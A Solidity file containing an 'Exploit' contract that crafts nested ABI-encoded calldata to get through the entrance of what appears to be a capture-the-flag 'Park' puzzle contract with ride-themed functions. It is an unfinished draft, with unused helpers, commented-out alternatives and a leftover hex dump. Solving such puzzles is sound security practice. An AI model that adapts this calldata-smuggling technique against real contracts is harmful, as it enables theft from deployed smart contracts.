pragma solidity ^0.8.11;
interface IPark {
    function parkEntrance(bytes calldata ticket) external;
    function _Carousel(bytes calldata ticket) external;
    function _BumperCars(bytes calldata blueCar, uint40 redCar, bytes calldata yellowCar) external;
    function _Rollercoaster(bytes[] memory ticket) external;
    function _HouseOfMirrors(bytes[] calldata houseLayout) external;
}

contract Exploit {
    constructor(IPark park) {
        bytes memory carousel_ticket = prepare_cars_ticket();
        bytes memory ticket = carousel_ticket;
        // bytes memory ticket = abi.encodeWithSignature("_BumperCars(bytes)", carousel_ticket);
        park.parkEntrance(ticket);
    }

    function prepare_carousel_ticket() public returns (bytes memory) {
        bytes memory ticket = prepare_cars_ticket();
        bytes memory nextRide;
        for(uint s = ticket.length; s > 0; s--) {
            nextRide = bytes.concat(nextRide, ticket[s-1]);
        }
        return nextRide;
    }

    function prepare_cars_ticket() public returns (bytes memory) {
        bytes memory roller_ticket = prepare_house_ticket();
        bytes memory blueCar = bytes("blue");
        uint40 redCar = uint40(bytes5(bytes.concat("255", "0", "0")));
        uint184 padding = type(uint152).max;
        // uint184 padding = type(uint184).max;
        // bytes memory ticket = abi.encodePacked(padding, roller_ticket);
        bytes memory ticket = roller_ticket;

        return abi.encodeWithSignature("_BumperCars(bytes,uint40,bytes)", blueCar, redCar, ticket);
    }
    // 0x626c75653235353030ffffffffffffffffffffffffffffffffffffffffffffff64757061

    function prepare_roller_ticket() public returns (bytes memory) {
        bytes memory house_ticket = prepare_house_ticket();

        bytes[] memory data = new bytes[](4);
        data[0] = bytes("");
        data[1] = bytes("");
        data[2] = bytes("");
        data[3] = house_ticket;

        return abi.encodeWithSignature("_HouseOfMirrors(bytes[])", house_ticket);
        // return hex"deaddead";
    }

    function prepare_house_ticket() public returns (bytes memory) {
        return bytes("dupa");
    }

    receive() external payable {
    }

    fallback() external payable {
    }
}